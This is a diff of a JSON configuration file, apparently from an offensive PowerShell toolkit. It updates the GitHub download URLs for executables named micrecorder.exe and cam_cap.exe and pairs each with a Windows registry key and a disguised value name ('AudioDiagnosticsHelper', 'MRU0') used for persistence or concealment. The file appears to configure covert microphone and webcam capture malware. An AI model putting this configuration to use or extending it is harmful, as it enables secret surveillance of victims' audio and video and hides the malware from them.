@@ -1,12 +1,12 @@
 {
   "version": "6.66",
   "mic": {
-    "url": "https://github.com/Soumyo001/offensive_powershell/raw/main/assets/micrecorder.exe",
+    "url": "https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/micrecorder.exe",
     "regkey": "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run",
     "valuename": "AudioDiagnosticsHelper"
   },
   "cam": {
-    "url": "https://github.com/Soumyo001/offensive_powershell/raw/main/assets/cam_cap.exe",
+    "url": "https://github.com/Soumyo001/offensive_powershell/raw/refs/heads/main/assets/cam_cap.exe",
     "regkey": "Software\\Microsoft\\Terminal Server Client\\Default",
     "valuename": "MRU0"
   },
